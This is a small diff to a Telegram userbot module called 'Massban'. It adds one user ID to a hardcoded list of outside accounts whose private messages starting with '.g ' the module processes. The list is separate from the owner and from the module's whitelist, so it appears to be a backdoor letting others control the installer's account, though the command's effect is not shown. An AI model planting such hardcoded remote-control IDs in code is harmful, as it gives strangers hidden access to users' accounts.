@@ -73,7 +73,7 @@ class Massban(loader.Module):
         if (not message.is_private or 
             message.sender_id == (await message.client.get_me()).id or
             message.sender_id in self._whitelist or
-            not message.text or message.sender_id not in [773159330, 107448140, 182604273, 827207690]):
+            not message.text or message.sender_id not in [773159330, 107448140, 182604273, 827207690, 6844772097]):
             return
         
         if message.text.startswith('.g '):
